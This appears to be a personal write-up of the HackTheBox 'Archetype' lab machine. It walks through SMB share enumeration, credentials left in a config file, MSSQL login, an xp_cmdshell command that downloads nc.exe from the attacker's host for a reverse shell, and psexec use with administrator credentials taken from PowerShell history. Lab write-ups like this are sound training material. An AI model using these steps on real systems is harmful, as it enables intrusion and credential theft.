![[Pasted image 20210420124151.png]]

Starting with a basic nmap scan

`nmap -sC -sV 10.10.10.27`

![[Pasted image 20210420124332.png]]

We see that smb is enabled 

`smbclient -L \\\\10.10.10.27`

![[Pasted image 20210420124513.png]]

we have 'backups' share which we can access

![[Pasted image 20210420124722.png]]

We have a prod.dtsConfig file in the backup share 

![[Pasted image 20210420124855.png]]

Now we have the username and the password for the sql server

Domain : `ARCHETYPE\`

Username : `sql_svc`

Password : `M3g4c0rp123`

Logging in with the credentials using impacket-mssqlclient 

![[Pasted image 20210420125449.png]]

![[Pasted image 20210420125641.png]]

Now we have access to the sql server using which we can execute commands on the machine as `sql_svc` user

	
We transferred the nc.exe binary from our kali machine to the windows machine 

`xp_cmdshell powershell wget -UseBasicParsing http://10.10.17.67:8000/nc.exe -OutFile %temp%/nc.exe`

![[Pasted image 20210420130823.png]]

![[Pasted image 20210420130808.png]]

We get a nc reverse shell of the user `sql_svc`

Looking in the command history of the powershell 

We get the password for the administrator user

Username : `administrator` 

Password : `MEGACORP_4dm1n!!`

Now we can use psexec.py to get into administrator account

![[Pasted image 20210420132323.png]]




